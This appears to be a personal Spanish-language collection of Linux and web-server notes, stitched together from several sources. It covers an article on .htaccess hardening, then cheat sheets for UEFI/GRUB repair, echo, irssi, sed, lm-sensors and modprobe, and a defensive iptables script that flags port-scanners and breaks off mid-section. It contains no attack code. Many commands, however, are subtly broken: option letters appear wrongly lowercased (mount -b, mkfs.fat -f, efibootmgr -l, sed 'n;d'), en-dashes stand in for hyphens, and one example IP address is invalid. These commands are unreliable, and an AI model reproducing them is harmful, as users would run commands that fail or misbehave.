El archivo .htaccess (hypertext access) es un archivo de configuracion muy popular en servidores web basados en Apache que permite a los administradores aplicar distintas politicas de acceso a directorios o archivos con la idea de mejorar la seguridad de su pagina web y, por tanto, evitar acceso a terceros. Cuando visitamos una pagina web cualquiera y pulsamos sobre un enlace o queremos descargarnos un archivo, en el proceso de tramite de la peticion, el servidor web consulta el archivo .htaccess con la idea de aplicar las directivas y restricciones definidas antes de cursar la peticion y, logicamente, cancelar peticiones que se encuentren prohibidas dentro de este archivo (cuyo ambito de actuacion es el directorio en el que se encuentra y todos los subdirectorios que se encuentran por debajo de este).

#### ?Y que podremos controlar con este archivo? #### 

Gracias a este archivo podremos configurar nuestro servidor web para hacerlo algo mas seguro pero, ademas, tambien podremos realizar redirecciones, crear mensajes de error personalizados, restringir el acceso a carpetas, evitar el listado de directorios de nuestro servidor o permitir el uso de nuestro dominio sin usar las famosas 'www'.


#### Poniendo el foco en la seguridad, vamos a dedicar unos minutos a revisar algunos puntos que deberiamos tener en cuenta a la hora de configurar nuestro servidor web: ####


#### Evitar el listado del contenido de un directorio ####

Uno de los primeros indicadores que nos pueden alertar de una configuracion insegura de un servidor web es poner en la barra de direcciones del navegador una url que apunte a un directorio del servidor (http://www.dominio.es/images) y que el navegador nos muestre un listado de las carpetas y archivos que ahi se alojan. Salvo que lo tengamos pensado asi de manera expresa, deberiamos evitar que este tipo de cosas sucedan puesto que estamos abriendo el contenido completo de nuestra web a terceros y, precisamente, para controlar este tipo de situaciones podemos usar las directivas DirectoryIndex u -Indexes para definir indices que eviten listar el contenido de una carpeta.


#### Proteger archivos y carpetas importantes ####

Si bien es importante evitar el acceso a los directorios, tambien lo es proteger archivos considerados criticos, como por ejemplo los archivos de configuracion. Si bien usar un gestor de contenidos web nos facilita mucho las cosas, estos responden a esquemas fijos que se repiten en cada instalacion y, por tanto, los archivos de configuracion se encuentran en ubicaciones muy concretas y conocidas.

Si pensamos un momento en WordPress, el archivo wp-config.php (que se encuentra en el raiz) almacena la direccion de nuestra base de datos, la base de datos que usamos asi como el usuario y la contrasena, una informacion de gran valor para un atacante externo. Para evitar el acceso a este tipo de archivos "singulares" podremos valernos de reglas como la siguiente para evitar que alguien acceda pueda acceder a nuestro archivo:

<files wp-config.php>
order allow,deny
deny from all
</files>


#### Otro detalle a tener en cuenta es la proteccion de carpetas criticas a las que nadie, salvo un administrador, deberia poder entrar. ?Y de que tipo de carpetas estamos hablando? Si retomamos el ejemplo de WordPress, nadie deberia poder entrar en la carpeta de los plugins o en la carpeta uploads y asi evitar que alguien recopile mas informacion de la cuenta. ?Y que podemos hacer en estos casos? Una buena forma, y elegante, de evitar el acceso es forzar una redireccion hacia nuestra pagina principal siguiendo esquemas como: ####

Redirect 301 /wp-content/index.php http://www.tudominio.com/
Redirect 301 /wp-content/themes/index.html http://www.tudominio.com/


#### Evitar el hotlink ####

Dependiendo del tipo de licencia que utilicemos a la hora de publicar nuestros contenidos o si, por ejemplo, queremos evitar que las fotos que colgamos acaben siendo utilizadas en otras paginas, quizas nos interese aplicar algun tipo de regla que evite que alguien pueda insertar una imagen que nosotros estamos hospedando (forzando asi a que, al menos, se la tengan que descargar y subir a su servidor).


#### Restringir el acceso por IP y luchar contra el spam ####

Si nuestro blog es victima de algun tipo de ataque y tenemos localizado el origen (una direccion IP o un rango de direcciones), podemos aplicar medidas estrictas de seguridad en el archivo .htaccess para restringir el acceso y bloquear cualquier tipo de peticion que provenga de las direcciones IP que agreguemos a esta lista negra. Ademas, si somos algo habilidosos y no tenemos ninguna proteccion contra el spam (Askimet es una buena opcion en WordPress), tambien podriamos definir reglas que eviten a ciertos usuarios (identificados por su direccion IP o por un rango de estas) a comentar en nuestro blog (bloqueandoles el acceso a la opcion de publicar comentarios).


#### ?Como pasamos de la teoria a la practica? ####

Ahora que hemos entrado en materia y somos conscientes de la importancia de este archivo, le pasamos el testigo a nuestro companero Eduardo que nos ayudara, de una manera practica, a trabajar con este archivo y nos introducira en la sintaxis a utilizar (el formato es igual que el fichero de configuracion global de Apache) ademas de mostrarnos algunos ejemplos practicos de configuraciones seguras. Un buen archivo .htaccess combinado con unos permisos adecuados en nuestros archivos son una buena barrera de defensa contra ataques y accesos no autorizados, si bien la seguridad total no se puede garantizar, al menos se lo pondremos algo mas dificil a aquellos que no tienen muy buenas intenciones.


#### Aunque por lo general asociamos .htaccess directamente con seguridad, es posible realizar otras cosas interesantes con estos ficheros. Crear uno de estos archivos es muy simple, podemos usar cualquier editor de texto y al salvarlo estar seguros de que lleva por nombre, exactamente, ".htaccess" sin las comillas ####


#### Crear paginas de error personalizadas ####

Ya todos sabemos que los servidores devuelven al cliente diferentes codigos de error cuando algo no anda bien, por ejemplo: el famoso 404 para las paginas no encontradas, 403 para acceso denegado o el temido error 500 que indica un problema interno con el servidor. Con .htaccess es posible redirigir a los visitantes hacia una pagina mucho mas amigable cuando uno de estos errores se presenta. Todo lo que debemos hacer es agregar el siguiente codigo a nuestro "fichero magico".

ErrorDocument 400 /error/400.html
ErrorDocument 401 /error/401.html
ErrorDocument 403 /error/403.html
ErrorDocument 404 /error/404.html
ErrorDocument 500 /error/500.html

Fuente: css-tricks


#### Forzar la descarga de tipos de fichero especificos ####

Si en nuestro sitio web ofrecemos acceso a diferentes tipos de archivos como .mp3, .pdf, .xls, etc, podemos establecer una configuracion para que estos se descarguen de manera forzada en lugar de permitir al navegador elegir que hacer con ellos. El codigo para realizar esto es el siguiente y solo debemos modificar la extension del tipo de archivo que deseamos forzar.

<Files *.mp3>
 ForceType application/octet-stream
 Header set Content-Disposition attachment
</Files>
<Files *.xls>
 ForceType application/octet-stream
 Header set Content-Disposition attachment
</Files>

Fuente: GiveGoodWeb


#### Prevenir el Hotlinking ####

En el articulo anterior aprendimos lo que significa Hotlinking (o Hotlink) y que es posible prevenirlo gracias a .htaccess. Con el siguiente codigo evitaremos que otros consuman nuestro valioso ancho de banda.

RewriteEngine On
#Cambiamos ?mysite\.com/ con la url de nuestro sitio
RewriteCond %{HTTP_REFERER} !^http://(.+\.)?mysite\.com/ [NC]
RewriteCond %{HTTP_REFERER} !^$
#Cambiamos /images/nohotlink.jpg con una imagen que indique que no toleramos los hotlinks
RewriteRule .*\.(jpe?g|gif|bmp|png)$ /images/nohotlink.jpg [L]

Fuente: wprecipes


#### Utilizar el cache para aumentar la velocidad de nuestro sitio ####

Probablemente este sea uno de los codigos mas valiosos de esta lista, ya que nos permitira acelerar de manera considerable la velocidad de carga de nuestro sitio utilizando el cache. Cada bloque de codigo a continuacion sirve para definir los tipos de archivo que se almacenaran en cache y la cantidad de tiempo -en segundos- que permaneceran alli.

# 1 Ano
<FilesMatch "\.(ico|pdf|flv)$">
Header set Cache-Control "max-age=29030400, public"
</FilesMatch>
# 1 Semana
<FilesMatch "\.(jpg|jpeg|png|gif|swf)$">
Header set Cache-Control "max-age=604800, public"
</FilesMatch>
# 2 Dias
<FilesMatch "\.(xml|txt|css|js)$">
Header set Cache-Control "max-age=172800, proxy-revalidate"
</FilesMatch>
# 1 Minuto
<FilesMatch "\.(html|htm|php)$">
Header set Cache-Control "max-age=60, private, proxy-revalidate"
</FilesMatch>

Fuente: AskApache


#### Crear una lista negra de direcciones IP ####

con .htaccess podemos combatir el SPAM de manera agresiva. Una forma de hacerlo es bloqueando las direcciones IP identificadas como fuente de comentarios basura. Copia y pega el siguiente codigo en el fichero .htaccess de tu servidor y reemplaza las direcciones IP por las que deseas bloquear.

<Limit GET POST PUT>
order allow, deny
allow from all
deny from 123.123.123.1
deny from 555.555.555.5
deny from 000.000.000.0
</Limit>

Fuente: Paulund


#### Crear un registro de errores de PHP ####

Mientras desarrollabas tu sitio usando PHP o quiza navegando por red, es probable que te hayas encontrado con una pagina que imprimia algun error de PHP como parte de la "decoracion". estos errores, ademas de ser desagradables para el usuario comun, puede brindar informacion sensible que puede ser aprovechada por un visitante malintencionado. Para evitar que se impriman en pantalla y, por el contrario, se registren en una bitacora dentro del servidor podemos usar el codigo a continuacion.

# evitar que los errores se muestren al usuario
php_flag display_startup_errors off
php_flag display_errors off
php_flag html_errors off
# registrar errores en la bitacora
php_flag log_errors on
php_value error_log /logs/php_error.log

Fuente: css-tricks


#############################################################################################################################################################################################

############################################################################################# uefi ##########################################################################################

#### gpt #### uefi

#### para hacer un chroot, primero hay que montar la partion donde se encuentra instalado ubuntu o la distro en cuestion ####

mount /dev/sdxx /mnt ; sleep 5 ; chroot /mnt

#### gpt para reinstalar grub en una bios con uefi uefi primero hay que montar la particion con ubuntu, despues la partirion uefi y despues ejecutar el siguiente comando para tener el sistema de archivos necesario para instalar grub  ####  for i in /dev /dev/pts /proc /sys /run; do mount -b $i /mnt$i; done  ####  luego  ####  chroot /mnt  ####  y por ultimo  grub-efi-amd64 

#### gpt aplicacion para interactuar con bios uefi uefi ####

efibootmgr

#### gpt agregar una entrada de ubuntu en la bios uefi uefi para poder bootear ubuntu ####

efibootmgr -c -w -l \\efi\\ubuntu\\shimx64.efi -l "ubuntu" -d /dev/sda

#### gpt cambiar el orden de booteo en bios uefi uefi ####

efibootmgr -o 0000,0001,0002

#### para que un sistema operativo pueda bootear en una pc con uefi el disco duro, tiene que tener una tabla de particiones gpt con su particion de booteo efi de entre unos 300m a 500m ####

#### gpt programa en ncurses para crear particiones efi ####

cgdisk /dev/sdxx   then   <new>  first sector <enter> (for default)   size <300m>   hex code or guid(l to show codes, enter =8300)  <ef00>   then type efi partition   ultemately  <write>

#### gpt las particiones efi tienen que estar en formato fat32 ####

mkfs.fat -f 32 /dev/sdxx

#### archivo de configuracion relacion con la entrada de microsoft windows en sistemas uefi uefi gpt ####

/usr/lib/os-probes/mounted/efi/20microsoft

#### https://help.ubuntu.com/community/uefi erik eric gpt uefi #####



#############################################################################################################################################################################################

############################################################################################# echo ##########################################################################################

#### echo

#### crear una nueva linea vacia utilizando echo para agregar continido a un archivo de texto ####

echo -e "\ncontenido\n a\n agregar\n" >> archivo.txt

#### activar "ip forwarding" ####

echo "1" > /proc/sys/net/ipv4/ip_forward

#### habilitar la interpretacion de caracteres de escape ####

echo -e [cadena]

#### prevenir accidentes al borrar archivos utilizando echo ####

echo rm *.png   - y vemos como sera el comando que se ejecutara

#### convertir una cadena ascii en hexadecimal ####

echo -n "text" | od -a n -t x1 |sed 's/ /\\x/g



#############################################################################################################################################################################################

############################################################################################# irssi #########################################################################################

#### irsi

#### irssi hacer que la lineas que contienen mi nick se vean mejor ####

/hilight nick

#### irssi crear un archivo log para luego leer las conversaciones importantes ####

/lastlog -f /home/curiousx/irclog.log

#### para registrarte en freenode como usuario ####

/msg nickserv register password email

#### para ocultar tu ip en irc tenes que conectarte a #freenode y pedir por un "cloak" ####

#### lista, anade o elimina servidores ####

/server

#### conecta con un servidor ####

/server [nombre:puerto:clave]

#### obtener informacion sobre servidor ####

/info [servidor]

#### obtener estadisticas del servidor ####

/lusers

#### usuarios conectados al servidor ####

/users

#### lista los servidores de la red actual ####

/links

#### lista e informa sobre los canales ####

/list

#### informa sobre el admin. del servidor ####

/admin

#### muestra la ayuda sobre un comando ####

/help [comando]

#### comprobar si un usuario esta conectado ####

/ison [nick]

#### unirse a un canal ####

/join [canal]

#### listar usuarios en canales ####

/names

#### muestra informacion sobre un usuario ####

/whois [nick]

#### informa sobre un usuario que ya no esta ####

/whowas [nick]

#### muestra informacion sobre patron ####

/who [patron]

#### cambiar de contrasena(en irc-hispano) ####

/msg nick set password [clave]

#### envia un mensaje a un usuario o canal ####

/msg [nick | canal][texto]

#### envia mensaje a todos los canales en los que estas ####

/amsg [texto]

#### envia un mensaje privado a un usuario/os ####

/notice [nick | canal]

#### envia un mensaje privado a un usuario ####

/query [usuario texto]

#### lista los usuarios ignorados ####

/ignore

#### ignora los mensajes de un usuario ####

/ignore nick

#### deja de ignorar el/los mensajes ####

/unignore [nick | *]

#### envia un mensaje mediante ctcp ####

/ctcp [nick texto]

#### \'-> precedido de nuestro nick ####

/me [texto]

#### \'->a todos los canales en los que estas ####

/ame [texto]

#### pide y/o inicia charla con un usuario ####

/dcc [chat nick ]

#### cierra charla ####

/dcc [close nick]

#### ofrece y/o envia un archivo ####

/dcc [send nick archivo]

#### permite recibir un archivo ####

/dcc [get nick archivo]

#### muestra fecha y hora ####

/time

#### limpia la ventana de texto actual ####

/clear

#### pasar a estado ausente ####

/away [texto]

#### volver de la ausencia ####

/away

#### cambiar el nick ####

/nick [nuevonick]

#### cambiar un nick registrado ####

/nick [nuevonick][clave]

#### identificarse enirc-hispano ####

/nick [nick:contrasena]

#### abandonar un canal ####

/part [canal]

#### cerrar todas las conexiones y salir ####

/quit



#### notas: ####

ctcp (protocolo de cliente a cliente): permite dar respuestas predeterminadas y automaticas ante una peticion espefifica de otro usuario.
dcc: protocolo que establece una conexion TCP directa entre dos ordenadores

#############################################################################################################################################################################################

############################################################################################# sed ###########################################################################################

#### sed

#### ls sintaxis basica de uso de sed es ####

sed [-ns] '[direccion] instruccion argumentos'

#### donde: [direccion] es opcional, siendo un numero de linea (n), rango de numeros de linea (n,m) o busqueda de regexp (/cadena/) indicando el ambito de actuacion de las instrucciones. si no se especifica [direccion], se actua sobre todas las lineas del flujo  #### 

#### instruccion puede ser: ####


 i = insertar linea antes de la linea actual.

 a = insertar linea despues de la linea actual.

 c = cambiar linea actual.

 d = borrar linea actual.

 p = imprimir linea actual en stdout.

 s = sustituir cadena en linea actual.

 r archivo = anadir contenido de "archivo" a la linea actual.

 w archivo = escribir salida a un archivo.

 ! = aplicar instruccion a las lineas no seleccionadas por la condicion.

 q = finalizar procesamiento del archivo.

 -n: no mostrar por stdout las lineas que estan siendo procesadas.

 -s: tratar todos los archivos entrantes como flujos separados.


#### este comando tambien lo usamos mucho, porque nos permite, de una forma comoda, borrar lineas, registros o sustituir cadenas de caracteres dentro de las lineas. con cadenas de texto normales la cosa es sencilla, pero al que mas y al que menos le resulta complicado cuando lo que hay que sustituir son caracteres especiales como el tabulador: \t o el caracter de nueva linea: \n. pero veamos como tampoco es complicado: imaginemos que tenemos un archivo con campos en los que el separador es el tabulador y queremos sustuir este caracter separador por otro caracter separador, como por ejemplo el punto y coma (;). lo haremos de la siguiente manera: ####

sed 's/\t/;/g' archivo

#### para borrar una linea hacemos lo siguiente: ####

sed 'n?_de_linead' archivo

#### podemos indicar un numero de linea concreto. por ejemplo: ####

sed '1d' archivo

#### podemos indicar un intervalo de lineas a borrar. por ejemplo: ####

sed '3,5d' archivo

#### tambien podemos indicar que queremos borrar desde una determinada linea en adelante: ####

sed '3,$d' archivo

#### otro ejemplo util es borrar las lineas en blanco de un archivo: ####

sed '/^$/d' archivo

#### a la hora de borrar, tambien podemos especificar una cadena, de tal forma que el comando borrara todas las lineas que contengan esa cadena. en este ejemplo borrara todas las lineas en blanco de archivo. ####

cat archivo | sed '/^[ ]*$/d' > archivodestino

#### otro de los usos mas interesantes de sed es sustituir cadenas. podemos sustituir una cadena por otra de la siguiente manera: ####

sed 's/cadena1/cadena2/' archivo

#### al ejecutar el comando anterior, se sustituye la primera cadena que encuentra por la segunda. pero, si lo que queremos es sustituir todas las cadenas que encuentre, en cada una de las lineas, anadimos el parametro g : ####

sed 's/cadena1/cadena2/g' archivo

#### por otra parte, tambien podemos hacer que sustituya la cadena1 por la cadena2 en un numero de linea concreto: ####

sed '5 s/usuario/usuario/g' archivo

#### buscar cadenas y reemplazarlas en multiples archivos usando grep y sed ####

grep -lr "foo" . | xargs sed -i "s/foo/bar/g"

#### eliminar una linea que coincida con una cadena en un archivo de texto ####

sed '/cadena/ d' archivo.txt > archivo_nuevo.txt

#### la opcion -i en sed edita un archivo en tiempo real, util para dar soporte en el primer ejemplo  remplaza la primera coincidencia que tenga archive por is.archive ####

sed -i 's/is.archive/archive/' /etc/apt/sources.list

#### si al comando sed le agregamos "g" al final de la explresion regular entonces aplicara los cambios a todas las coincidencia que encuentre dentro del archivo a editar ejemplo ####

sed -i 's/is.archive/archive/g' /etc/apt/sources.list

#### con el siguiente comando utilizando sed podemos borrar todas las lineas vacias de un archivo ####

sed -e '/^$/d' archivo

#### si quisieramos guardar el resultado del archivo solo redireccionamos la salida a otro archivo nuevo asi ####

sed -e '/^$/d' archivo > archivo_nuevo

#### para borrar comentarios que comienzan con # en un archivo de texto seria asi sed ####

sed -e '/^#/d' archivo   - podemos cambiar el numeral por otro patron por ejemplo para borrar comentarios en html reemplazariamos "####" por "<" asi:  sed -e '/^</d' archivo

#### si quisieramos borrar todos los espacios al comienzo de un archivo utilizando sed seria algo asi ####

sed 's/^ *//g' archivo

#### si queres reemplazar todos los espacios de un archivo por tabuladores ariamos ####

sed 's/\ /\t/g' archivo

#### con este comando sed filtraria las lineas que comienzan con d y con f en un archivo, funcionaria como grep, la option -n hace que solo imprima lo que coincide y "p" = print "d" = delete ####

sed -n -e '/^[df]/p' archivo

#### tambien podriamos hacer que sed imprima en bloques algo asi como awk, este comando imprimiria desde la primera coincidencia hasta las ultima coincidencia en bloque ####

sed -n -e '/coincidencia_1/,/coincidencia_2/p' archivo.txt

#### imprimir una linea especifica de un archivo ####

sed -n 5p archivo

#### prara reemplazar texto en sed se utiliza "s". "s" reemplazaria la primera coincidencia, por un valor o una palabra que indiquemos asi ####

sed 's/coincidencia/nuestro_reemplazo/' archivo    con el parametro "'" seguido de un numero, indicariamos que el reemplazo se aplique a x linea: sed '6 's/coincidencia/nuestro_reemplazo/' archivo

#### para agregar una linea en blanco para cada linea de un archivo en sed hariamos ####

sed g archivo

#### para borrar una linea en blanco por cada linea de un archivo en sed hariamos ####

sed 'n;d' archivo

#### para agregar una linea en blanco arriba de la cadena que indiquemos en sed seria ####

sed '/cadena/{x;p;x;}' archivo

#### para agregar una linea en blanco abajo de la cadena que indiquemos en sed seria ####

sed '/cadena/g' archivo

#### para agregar una linea en blanco abajo y arriba de la cadena que indiquemos en sed seria ####

sed '/4/{x;p;x;g;}' archivo

#### si queremos agregar espacios al inicio de cada linea de un archivo en sed hariamos ####

sed 's/^/     /' archivo

#### imprimir la primera linea de un archivo en sed ####

sed q archivo

#### imprimir las primeras dos lineas de un archivo en sed ####

sed 2q archivo

#### imprimir las ultimas tres lineas de un archivo usando sed ####

sed -e :a -e '$q;n;4,$d;ba' archivo

#### filtrar solo las lineas que coinciden con una cadena en sed ####

sed '/cadena/!d' archivo

#### filtrar solo las lineas que no no coinciden con una cadena en sed ####

sed '/cadena/d' archivo

#### para borrar la primera linea de un archivo en sed hariamos ####

sed '1d' archivo

#### para borrar la 3 y la 5 linea de un archivo en sed hariamos ####

sed '3,5d' archivo

#### para borrar desde la tercera linea de un archivo en adelante en sed hariamos ####

sed '3,$d' archivo

#### para utilizar variables con sed tenemos que utilizar doble comillas "" en lugar de comillas simple '' ####

sed "s/cadena/$(date +%b)/g" archivo

#### cambiar uno o varias cadenas de un archivos de texto utilizando "sed" cambiando solo una cadena que coincido con "foo" por "bar" ####

sed -e 's/foo/bar/' miarchivo.txt

#### cambiando todas las coincidencias que contengan "foo" por "bar" ####

sed -e 's/foo/bar/g' miarchivo.txt

#### convert the "dos" file format to unix file format using sed command ####

sed 's/.$//' filename

#### add line number for all non-empty-lines in a file using sed ####

sed '/./=' thegeekstuff.txt | sed 'n; s/\n/ /'

#### in unix environment: convert dos newlines (cr/lf) to unix format ####

sed  's/.$//' archivo.txt

#### print section of file from regular expression html to end of file ####

sed -n '/<div class=contentepisodeleft>/,$p' archivo.txt   - case sensitive

#### print section of file between two regular expressions (inclusive) ####

sed -n '/<div class=contentepisodeleft>/,/<div class="infoboxbottom">/p'> archivo.txt   - case sensitive

#### print section of file between two regular expressions (inclusive) ####

httppathfile=$(sed -n '/<div class=contentepisoderight>/,/<\/a>/p' archivo.txt|   - case sensitive

#### replace quotes with @ for awk as " cannot be used as a seperator ####

sed 's/"/@/g' archivo.txt

#### delete leading whitespace (tabs and spaces) from each line. ####

sed 's/^[ \t]*//'

#### remove all the html tags ####

sed -e :a -e 's/<[^>]*>//g;/</n;//ba' archivo.html

#### if a line ends with a backslash, append the next line to it #####

sed -e :a -e '/:$/n; s/\n//; ta'

#### delete the last line of a file ####

sed '$d' archivo.txt

#### print first line of file (emulates "head -1") ####

sed q archivo.txt 

#### Descomentar las líneas que contienen un patrón determinado ####

sed -i "s/^#\/usr\/sbin\/sinc_puppet_inst\ \&/\/usr\/sbin\/sinc_puppet_inst\ \&/" /etc/rc.local

#### Comentar las líneas que contengan un patrón determinado ####

sed -i  "s/\/usr\/sbin\/sinc_puppet_inst\ \&/#&/" /etc/rc.local   - Donde el & representa el texto coincidente con el patron

#### Filter delete links using sed ####

sed 's|http://whatevershortner.com/short.php?u=||g' back.txt > back_back.txt

#### Filter clean youtube urls ####

sed 's|&feature=em-uploademail||g' des_tmp.txt > des.txt

###################################################################################### file globing sed #####################################################################################

#### sed (stream editor) es un editor de textos usado, no interactivamente, sino en flujos. esto permite transformar la salida del texto desde una tuberia o de la linea de comandos. ####

#### sed soporta expresiones regulares que da un gran control sobre lo que se puede hacer al flujo de entrada. las aplicaciones comunes de sed incluyen el analisis sintactico de archivos de log, reemplazo de palabras y errores de tipeo en un flujo, y lectura de archivos csv ####

#### puede usarse para borrar una linea determinada ####

sed 'nUmero_de_linead' archivo

#### puede elegir un conjunto de lineas para borrar ####

sed 'nUmero_de_linea_inicial,Umero_de_linea_finald' archivo

#### puede borrar las lineas que coincidan con un patron determinado por una expresion regular ####

sed '/patron/d' archivo

#### puede reemplazar una cadena de texto por otra, cada vez que aparezca ####

sed 's/viejo/nuevo/g' archivo

#### o solo la primera vez que aparezca en cada linea #####

sed 's/viejo/nuevo/'

#### puede anadir una linea despues de cada linea del archivo ####

sed 'a\linea insertada' archivo

#### recuerdo de la salida ####

#### sed puede recordar partes de los patrones de entrada, y reemplazar esa seccion en el archivo de salida. esto se hace a traves  de los comandos $, | \(, \), \1-9 ####

#### multiples substituciones ####

#### normalmente, sed puede solamente hacer una substitucion a la vez; sed 's/viejo1/nuevo1/g' 's/viejo2/nuevo2' no funcionara. sin embargo, la opcion -e permite multiples comandos. poner una "-e" antes de todos los comandos: ####

sed -e 's/viejo1/nuevo1/g' -e 's/viejo2/nuevo2/g'



#############################################################################################################################################################################################

########################################################################################## lm-sensors #######################################################################################

#### lm-sensors #### sensors 

#### usar lm-sensors para monitorear la temperatura de la cpu #### 

#### para esto necesitaremos el paquete lm-sensors. despues de instalarlo, tendras que cargar varios modulos con "sensors-detect" al kernel para la deteccion de la temperatura (esto se hace automaticamente y tu solo tienes que aceptar o cancelar la carga del modulo especifico). para ejecutarlo, solo tienes que escribir sensors en un terminal: ####

sensors-detect

#### sensors-detect detecta, instala y carga los sensores y los modulos necesarios ####

sensors-detect

#### tras ejecutar el anterior comando podremos ver la temperaturas, voltajes y revoluciones de ventilador entre otras cosas con el comando: ####

sensors



#############################################################################################################################################################################################

########################################################################################### modprobe ########################################################################################

#### modprobe

#### deshacerse de los pitidos del sistema quitando el modulo pcspkr con modprobe ####

#### para desactivar temporalmente el altavoz de la pc se puede quitar el modulo del kernel con el comando siguiente como root: ####

modprobe -r pcspkr

#### para desactivarlo permanentemente, puedes anadir el modulo a la lista negra por lo que no se cargara cuando se inicie el sistema. para ello, edita el archivo /etc/modprobe.d/blacklist como root y anade la siguiente linea en el: ####

blacklist pcspkr



#############################################################################################################################################################################################

########################################################################################## iptables #########################################################################################

IPSET_HOSTS="185.199.108.133,116.202.120.181,104.16.37.47,104.16.38.47,104.20.4.21,104.20.5.21,138.201.14.212,151.101.4.133,185.21.103.31,188.40.39.38,199.188.221.36,208.70.186.167,209.124.55.40"

NOTE: iptables v1.6.1: multiport only works with TCP, UDP, UDPLITE, SCTP and DCCP

# Monitor what's going on.
sudo watch --interval=5 'iptables -nvL | grep -v "0     0"'

# Limit connections with iptables
# Limiting packets: the limit module

# In order to understand how this module works, we’ll use an analogy. Suppose, you’re given a bucket containing 5 tokens. Whenever a packet comes in, you should throw out a token. Also, you can’t allow a packet if the bucket is empty. In addition, you can add back 
# tokens at the rate of 3 in an hour (or 1 in 20 minutes). Technically, the number of tokens is the “limit-burst” value, and the rate at which you can refill it is the “limit” value.i

# Regulate a blocking action by time
iptables –A OUTPUT -p tcp -m multiport --dport http,https -i eth0 -o eth1 -m time --timestart 12:00 –timestop 13:00 –d 31.13.64.0/18  -j ACCEPT

# Get information about hosts CIDR to block them entirely

host -t a www.facebook.com
www.facebook.com is an alias for star.c10r.facebook.com.
star.c10r.facebook.com has address 31.13.65.17

whois 31.13.65.17 | grep inetnum
inetnum:        31.13.64.0 - 31.13.127.255

host -t a www.github.com
www.github.com is an alias for github.com.
github.com has address 192.30.255.113

whois 192.30.255.113 | grep -i cidr
CIDR:        192.30.255.113 - 192.30.255.255

iptables -A OUTPUT -p tcp -i eth0 –o eth1 –d 31.13.64.0/18 -j DROP

### Stackexchange ###



From man iptables:

raw: This table is used mainly for configuring exemptions from connection
     tracking in combination with the NOTRACK target. It registers at the
     netfilter hooks with higher priority and is thus called before
     ip_conntrack, or any other IP tables.
     It  provides the following built-in chains:

     - PREROUTING (for packets arriving via any network interface)
     - OUTPUT (for packets generated by local processes)

Analysis:

So, the RAW table is before conntrack and it was designed with the objective to be used to set the NOTRACK mark on packets that you do not wish to track in netfilter.

The -j targets are not restricted only to NOTRACK, so yes, you con filter packets in the raw table with the benefits of less CPU/memory consumption.

Most often, servers don't need to keep track of all connections. You only 
need tracking if you need to filter packets in iptables based on previous established connections. On servers that only serve a simple purpose like with only port 80 (and maybe 21) open, don't require that. In those instances, you can disable connection tracking.

However, if you're trying to run a NAT router, things get slightly complicated. In order to NAT something, you need to keep track of those connections so you can deliver packets from the outside network to the internal network.

If a whole connection is set with NOTRACK, then you will not be able to track related connections either, 
conntrack and nat helpers will simply not work for untracked connections, nor will related ICMP errors do. You will have to open up for these manually in other words. When it comes to complex protocols such as FTP and SCTP and others, this can be very hard to 
manage.

Use cases:

One example would be if you have a heavily trafficked router that you want to firewall the incoming and outgoing traffic on, but not the routed traffic. Then, you could set the NOTRACK mark for ignore the forwarded traffic to save processing power.

Another example when NOTRACK can be used is if you have a highly trafficked web-server, you could then set up a rule that turns of tracking for port 80 on all the locally owned IP addresses, or the ones that are actually serving web traffic. You could then enjoy 
stateful tracking on all other services, except for web traffic which might save some processing power on an already overloaded system.

Example --> https://web.archive.org/web/20160413034150/https://jonatan.nilsson.is/running-a-semi-stateless-linux-router-for-private-network/

Conclusion: There isn't a strong reason to not to use the raw table, but there is some reasons to take care when using the NOTRACK target in the raw table.


### Back Rules ###

# *THIS IS WHERE ALL THE SCREWING MAGIC HAPPENS* LOG and DROP NERDS KIDOS scanning ports
echo "\e[32mActivating \e[33mNERD detector..."
$IPSET restore < /etc/ipset-blacklist/udpbadbois.restore
$IPT -t raw -A PREROUTING -i $IFACE -p tcp -m set --match-set tcpbadbois src -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[IPSET] TCP badbois: "
$IPT -t raw -A PREROUTING -i $IFACE -p udp -m set --match-set udpbadbois src -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[IPSET] UDP badbois: "
$IPT -t raw -A PREROUTING -i $IFACE -p tcp -m tcp ! --dport $TCP_SERVICES -j SET --add-set tcpbadbois src -m comment --comment "[TCP PORT SCAN]"
$IPT -t raw -A PREROUTING -i $IFACE -p udp -m udp ! --dport $UDP_SERVICES -j SET --add-set udpbadbois src -m comment --comment "[UDP PORT SCAN]"
$IPT -t raw -A PREROUTING -i $IFACE -p tcp -m tcp -m multiport ! --sports $WEBPORTS,$LOCALFW -j SET --add-set tcpbadbois src -m comment --comment "[TCP PORT SCAN]"
$IPT -t raw -A PREROUTING -i $IFACE -p udp -m udp -m multiport ! --sports $WEBPORTS -j SET --add-set udpbadbois src -m comment --comment "[UDP PORT SCAN]"
$IPT -t raw -A PREROUTING -m set --match-set tcpbadbois src -j NERDS -m comment --comment "[DROP TCP NERD]"
$IPT -t raw -A PREROUTING -m set --match-set udpbadbois src -j NERDS -m comment --comment "[DROP UDP NERD]"

# Allow Echo Request and Reply 
echo "\e[32mAllow \e[33mecho requests and reply..."
$IPT -A INPUT -i $IFACE -p icmp -m icmp --icmp-type echo-request -m limit --limit 1/sec --limit-burst 1 -j ACCEPT -m comment --comment "ACCEPT ICMP REQUEST"
$IPT -A OUTPUT -o $IFACE -p icmp -m icmp --icmp-type echo-reply -j ACCEPT -m comment --comment "ACCEPT ICMP REPLY"

# All tcp connections should begin with syn
echo "\e[33mLogging and Forcing connections to begin with SYN..."
$IPT -A INPUT -i $IFACE -p tcp ! --syn -m conntrack --ctstate NEW -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[NON SYN CONN]: "
$IPT -A INPUT -i $IFACE -p tcp ! --syn -m conntrack --ctstate NEW -j DROP -m comment --comment "DROP NON SYN CONN"

# Blocking excessive syn packet
echo "\e[31mBlocking \e[33mSYN packets..."
$IPT -N SYN_FLOOD
$IPT -A INPUT -p tcp --syn -j SYN_FLOOD
$IPT -A SYN_FLOOD -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[SYN FLOOD]: "
$IPT -A SYN_FLOOD -j DROP -m comment --comment "DROP EXCESSIVE SYN"

# LOG and DROP INVALID packets
echo "\e[31mDropping \e[33mINVALID packets... "
$IPT -A INPUT -i $IFACE -m conntrack --ctstate INVALID -m limit --limit 1/sec --limit-burst 1 -j LOG --log-prefix "[INVALID PACKETS]: "
$IPT -A INPUT -i $IFACE -m conntrack --ctstate INVALID -j DROP -m comment --comment "DROP INVALID PACKETS"

# Protection against spoofing attacks
echo "\e[33mLogging and \e[31mdropping \e[33mspooffing \e[31mattacks"
